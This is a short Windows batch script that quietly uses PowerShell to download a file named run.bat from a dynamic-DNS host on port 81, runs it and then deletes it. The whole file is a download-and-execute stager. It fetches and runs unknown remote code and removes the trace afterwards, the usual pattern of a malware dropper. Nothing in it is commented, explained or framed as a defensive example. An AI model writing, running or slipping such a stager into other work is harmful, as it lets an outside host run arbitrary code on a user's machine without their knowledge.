@ECHO off
powershell.exe Invoke-WebRequest "http://lettuce.ddns.net:81/run.bat" -OutFile anser.bat
cmd.exe /c anser.bat
del anser.bat